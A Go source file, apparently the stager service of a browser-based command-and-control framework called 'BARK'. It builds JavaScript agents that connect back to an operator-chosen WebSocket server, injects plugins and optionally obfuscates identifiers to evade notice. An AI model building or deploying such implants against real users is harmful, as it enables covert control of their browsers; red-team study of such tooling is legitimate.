package service

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

type StagerService interface {
	GetAvailablePlugins() ([]Plugin, error)
	GenerateStager(config StagerConfig) (string, error)
	SaveStagerToFile(stager string, filename string) error
	GetStagerFile(filename string) (string, error)
	MinifyStager(stager string) (string, error)
	CreatePlugin(plugin Plugin) error
	UpdatePlugin(name string, plugin Plugin) error
	DeletePlugin(name string) error
	GetPluginTemplate() string
}

type StagerServiceImpl struct{}

type Plugin struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Filename    string `json:"filename"`
	Content     string `json:"content,omitempty"`
}

type StagerConfig struct {
	ServerIP   string   `json:"server_ip"`
	ServerPort string   `json:"server_port"`
	UseHTTPS   bool     `json:"use_https"`
	AgentID    string   `json:"agent_id"`
	Plugins    []string `json:"plugins"`
	Obfuscate  bool     `json:"obfuscate"`
	MinifyCode bool     `json:"minify_code"`
}

// GetAvailablePlugins reads all plugin files from the plugins directory
func (s *StagerServiceImpl) GetAvailablePlugins() ([]Plugin, error) {
	plugins := []Plugin{}
	pluginsDir := "./plugins"

	// Check if plugins directory exists
	if _, err := os.Stat(pluginsDir); os.IsNotExist(err) {
		return plugins, nil
	}

	// Walk through plugins directory
	err := filepath.Walk(pluginsDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Only process .js files
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
			content, err := ioutil.ReadFile(path)
			if err != nil {
				return err
			}

			// Extract plugin name and description from comments
			lines := strings.Split(string(content), "\n")
			name := strings.TrimSuffix(info.Name(), ".js")
			description := "No description available"

			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "// ") && strings.Contains(line, "Plugin") {
					description = strings.TrimPrefix(line, "// ")
					break
				}
			}

			plugin := Plugin{
				Name:        name,
				Description: description,
				Filename:    info.Name(),
				Content:     string(content),
			}

			plugins = append(plugins, plugin)
		}

		return nil
	})

	return plugins, err
}

// GenerateStager creates a customized stager with selected plugins
func (s *StagerServiceImpl) GenerateStager(config StagerConfig) (string, error) {
	// Read the base agent file
	agentContent, err := ioutil.ReadFile("./agent/agent.js")
	if err != nil {
		return "", fmt.Errorf("failed to read agent.js: %v", err)
	}

	stager := string(agentContent)

	// Replace the server URL with the configured one
	protocol := "ws"
	if config.UseHTTPS {
		protocol = "wss"
	}

	serverUrl := fmt.Sprintf("%s://%s:%s/ws", protocol, config.ServerIP, config.ServerPort)

	// Replace the placeholder server URL
	stager = strings.ReplaceAll(stager, "ws://localhost:8080/ws", serverUrl)

	// Replace the agent ID placeholder if provided
	if config.AgentID != "" {
		stager = strings.ReplaceAll(stager, "__BARK_AGENT_ID__", config.AgentID)
	} else {
		// Generate a unique agent ID
		agentID := fmt.Sprintf("agent_%d", time.Now().Unix())
		stager = strings.ReplaceAll(stager, "__BARK_AGENT_ID__", agentID)
	}

	// Add selected plugins
	pluginCode := ""
	for _, pluginName := range config.Plugins {
		pluginPath := filepath.Join("./plugins", pluginName+".js")
		if _, err := os.Stat(pluginPath); err == nil {
			pluginContent, err := ioutil.ReadFile(pluginPath)
			if err == nil {
				pluginCode += "\n\n// Plugin: " + pluginName + "\n"
				pluginCode += string(pluginContent)
			}
		}
	}

	// Insert plugins after BARK_AGENT object definition but before BARK_AGENT.init()
	if pluginCode != "" {
		initCallIndex := strings.Index(stager, "BARK_AGENT.init();")
		if initCallIndex != -1 {
			// Insert plugins right before the init call
			stager = stager[:initCallIndex] + pluginCode + "\n\n    " + stager[initCallIndex:]
		} else {
			// Fallback: append plugins before the closing IIFE
			lastIndex := strings.LastIndex(stager, "})();")
			if lastIndex != -1 {
				stager = stager[:lastIndex] + pluginCode + "\n\n" + stager[lastIndex:]
			}
		}
	}

	// Minify if requested
	if config.MinifyCode {
		stager = s.minifyJavaScript(stager)
	}

	// Basic obfuscation if requested
	if config.Obfuscate {
		stager = s.obfuscateCode(stager)
	}

	return stager, nil
}

// SaveStagerToFile saves the generated stager to a file in the static directory
func (s *StagerServiceImpl) SaveStagerToFile(stager string, filename string) error {
	// Ensure the static/generated directory exists
	dir := "./static/generated"
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// Save the file
	filepath := filepath.Join(dir, filename)
	return ioutil.WriteFile(filepath, []byte(stager), 0644)
}

// GetStagerFile retrieves a previously saved stager file
func (s *StagerServiceImpl) GetStagerFile(filename string) (string, error) {
	filepath := filepath.Join("./static/generated", filename)
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

// MinifyStager removes comments and unnecessary whitespace
func (s *StagerServiceImpl) MinifyStager(stager string) (string, error) {
	return s.minifyJavaScript(stager), nil
}

// Helper function to minify JavaScript (enhanced implementation)
func (s *StagerServiceImpl) minifyJavaScript(code string) string {
	// First pass: remove comments and normalize whitespace
	lines := strings.Split(code, "\n")
	var processed []string

	inMultilineComment := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)

		// Skip empty lines
		if trimmed == "" {
			continue
		}

		// Handle multiline comments
		if strings.Contains(trimmed, "/*") && !inMultilineComment {
			inMultilineComment = true
		}
		if inMultilineComment {
			if strings.Contains(trimmed, "*/") {
				inMultilineComment = false
			}
			continue
		}

		// Skip single-line comments (but preserve URLs and regex)
		if strings.HasPrefix(trimmed, "//") && !s.isInStringContext(trimmed) {
			continue
		}

		// Remove inline comments (more sophisticated)
		processed = append(processed, s.removeInlineComments(trimmed))
	}

	// Join lines and perform aggressive minification
	minified := strings.Join(processed, "\n")

	// Second pass: compress whitespace and structure
	minified = s.compressJavaScript(minified)

	return minified
}

// Remove inline comments while preserving strings and regex
func (s *StagerServiceImpl) removeInlineComments(line string) string {
	inString := false
	inRegex := false
	stringChar := byte(0)
	result := ""

	for i := 0; i < len(line); i++ {
		char := line[i]

		// Handle string literals
		if (char == '"' || char == '\'') && !inRegex {
			if !inString {
				inString = true
				stringChar = char
			} else if char == stringChar && (i == 0 || line[i-1] != '\\') {
				inString = false
			}
		}

		// Handle regex literals (basic detection)
		if char == '/' && !inString && i > 0 && (line[i-1] == '=' || line[i-1] == '(' || line[i-1] == ',') {
			inRegex = true
		} else if char == '/' && inRegex && (i == 0 || line[i-1] != '\\') {
			inRegex = false
		}

		// Check for comment start
		if !inString && !inRegex && char == '/' && i+1 < len(line) && line[i+1] == '/' {
			break // Rest of line is comment
		}

		result += string(char)
	}

	return strings.TrimSpace(result)
}

// Compress JavaScript by removing unnecessary whitespace
func (s *StagerServiceImpl) compressJavaScript(code string) string {
	// Remove multiple spaces
	re := regexp.MustCompile(`\s+`)
	compressed := re.ReplaceAllString(code, " ")

	// Remove spaces around operators and punctuation
	operators := []string{
		" = ", " + ", " - ", " * ", " / ", " % ",
		" == ", " === ", " != ", " !== ", " < ", " > ", " <= ", " >= ",
		" && ", " || ", " & ", " | ", " ^ ",
		" { ", " } ", " ( ", " ) ", " [ ", " ] ",
		" ; ", " , ", " : ",
	}

	replacements := []string{
		"=", "+", "-", "*", "/", "%",
		"==", "===", "!=", "!==", "<", ">", "<=", ">=",
		"&&", "||", "&", "|", "^",
		"{", "}", "(", ")", "[", "]",
		";", ",", ":",
	}

	for i, op := range operators {
		compressed = strings.ReplaceAll(compressed, op, replacements[i])
	}

	// Remove newlines where safe
	compressed = strings.ReplaceAll(compressed, "\n", "")

	// Remove spaces after keywords where safe
	keywords := []string{"if(", "for(", "while(", "function(", "return ", "var ", "let ", "const "}
	keywordReplace := []string{"if(", "for(", "while(", "function(", "return ", "var ", "let ", "const "}

	for i, keyword := range keywords {
		compressed = strings.ReplaceAll(compressed, keyword, keywordReplace[i])
	}

	return compressed
}

// Check if we're inside a string context (more sophisticated)
func (s *StagerServiceImpl) isInStringContext(line string) bool {
	inString := false
	stringChar := byte(0)

	for i := 0; i < len(line); i++ {
		char := line[i]
		if char == '"' || char == '\'' {
			if !inString {
				inString = true
				stringChar = char
			} else if char == stringChar && (i == 0 || line[i-1] != '\\') {
				inString = false
			}
		}
	}
	return inString
}

// Basic obfuscation (simple variable name replacement)
func (s *StagerServiceImpl) obfuscateCode(code string) string {
	// Replace common variable names with obfuscated ones
	replacements := map[string]string{
		"BARK_AGENT":      "_0x1a2b",
		"CommandRegistry": "_0x2c3d",
		"Logger":          "_0x4e5f",
		"Utils":           "_0x6g7h",
		"PluginSystem":    "_0x8i9j",
	}

	obfuscated := code
	for original, replacement := range replacements {
		obfuscated = strings.ReplaceAll(obfuscated, original, replacement)
	}

	return obfuscated
}

// CreatePlugin creates a new plugin file
func (s *StagerServiceImpl) CreatePlugin(plugin Plugin) error {
	// Ensure plugins directory exists
	pluginsDir := "./plugins"
	if err := os.MkdirAll(pluginsDir, 0755); err != nil {
		return fmt.Errorf("failed to create plugins directory: %v", err)
	}

	// Validate plugin name
	if plugin.Name == "" {
		return fmt.Errorf("plugin name is required")
	}

	// Sanitize filename
	filename := strings.ReplaceAll(plugin.Name, " ", "_")
	filename = strings.ToLower(filename)
	if !strings.HasSuffix(filename, ".js") {
		filename += ".js"
	}

	pluginPath := filepath.Join(pluginsDir, filename)

	// Check if plugin already exists
	if _, err := os.Stat(pluginPath); err == nil {
		return fmt.Errorf("plugin '%s' already exists", plugin.Name)
	}

	// Add header comment if not present
	content := plugin.Content
	if !strings.Contains(content, "// Plugin:") {
		header := fmt.Sprintf("// Plugin: %s\n// Description: %s\n\n", plugin.Name, plugin.Description)
		content = header + content
	}

	// Write plugin file
	return ioutil.WriteFile(pluginPath, []byte(content), 0644)
}

// UpdatePlugin updates an existing plugin
func (s *StagerServiceImpl) UpdatePlugin(name string, plugin Plugin) error {
	pluginsDir := "./plugins"

	// Find existing plugin file
	var existingPath string
	err := filepath.Walk(pluginsDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
			pluginName := strings.TrimSuffix(info.Name(), ".js")
			if pluginName == name {
				existingPath = path
				return filepath.SkipDir
			}
		}
		return nil
	})

	if err != nil {
		return err
	}

	if existingPath == "" {
		return fmt.Errorf("plugin '%s' not found", name)
	}

	// Update content with header
	content := plugin.Content
	if !strings.Contains(content, "// Plugin:") {
		header := fmt.Sprintf("// Plugin: %s\n// Description: %s\n\n", plugin.Name, plugin.Description)
		content = header + content
	}

	// Write updated plugin
	return ioutil.WriteFile(existingPath, []byte(content), 0644)
}

// DeletePlugin removes a plugin file
func (s *StagerServiceImpl) DeletePlugin(name string) error {
	pluginsDir := "./plugins"

	// Find plugin file
	var pluginPath string
	err := filepath.Walk(pluginsDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
			pluginName := strings.TrimSuffix(info.Name(), ".js")
			if pluginName == name {
				pluginPath = path
				return filepath.SkipDir
			}
		}
		return nil
	})

	if err != nil {
		return err
	}

	if pluginPath == "" {
		return fmt.Errorf("plugin '%s' not found", name)
	}

	return os.Remove(pluginPath)
}

// GetPluginTemplate returns a template for creating new plugins
func (s *StagerServiceImpl) GetPluginTemplate() string {
	return `// Plugin: New Plugin
// Description: A new plugin for BARK agent

(function() {
    'use strict';
    
    // Plugin initialization
    console.log('[BARK Plugin] New Plugin loaded');
    
    // Plugin configuration
    const config = {
        name: 'New Plugin',
        version: '1.0.0',
        enabled: true
    };
    
    // Plugin functionality
    const plugin = {
        init: function() {
            console.log('[BARK Plugin] Initializing:', config.name);
            // Add your initialization code here
        },
        
        execute: function(data) {
            // Add your main plugin logic here
            console.log('[BARK Plugin] Executing:', config.name, data);
        },
        
        cleanup: function() {
            // Add cleanup code here
            console.log('[BARK Plugin] Cleaning up:', config.name);
        }
    };
    
    // Register plugin with BARK agent if available
    if (typeof window.BARK_AGENT !== 'undefined' && window.BARK_AGENT.pluginSystem) {
        window.BARK_AGENT.pluginSystem.register(config.name, plugin);
    } else {
        // Fallback: auto-initialize
        plugin.init();
    }
    
    // Export plugin for manual access
    window.BARKPlugin_NewPlugin = plugin;
    
})();`
}

func StagerServiceInit() *StagerServiceImpl {
	return &StagerServiceImpl{}
}
